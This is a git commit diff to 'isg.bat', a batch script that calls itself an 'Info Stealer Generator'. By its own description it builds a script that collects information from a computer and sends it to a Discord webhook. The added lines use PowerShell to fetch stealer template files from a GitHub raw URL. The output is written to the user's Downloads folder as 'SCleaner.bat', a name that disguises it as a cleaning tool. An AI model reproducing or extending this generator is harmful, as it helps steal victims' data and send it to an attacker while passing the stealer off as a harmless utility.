6d03500c30e727b096728e1260d718ac8bd27db3
SchooiCodes <robloxianskp@gmail.com>
2024-10-09 16:44:30 +0300

    Updated the Info Stealer Generator

--- Files/isg.bat
+++ Files/isg.bat
@@ -12,6 +12,8 @@ echo =======================
 echo I AM NOT RESPONSIBLE FOR ANYTHING CAUSED BY THIS SCRIPT.
 echo This will generate a batch script that will collect info from a computer and send it to a discord webhook.
 echo.
+if not exist isgen.txt echo Downloading isgen.txt.. & echo. & powershell -Command "irm https://raw.githubusercontent.com/SchooiCodes/smt/refs/heads/main/Files/isgen.txt -OutFile isgen.txt"
+if not exist isgen2.txt echo Downloading isgen2.txt.. & echo. & powershell -Command "irm https://raw.githubusercontent.com/SchooiCodes/smt/refs/heads/main/Files/isgen2.txt -OutFile isgen2.txt"
 set /p webhook=Please enter a webhook URL: 
 if exist "%USERPROFILE%\Downloads\SCleaner.bat" del "%USERPROFILE%\Downloads\SCleaner.bat"
 type isgen.txt>>"%USERPROFILE%\Downloads\SCleaner.bat"
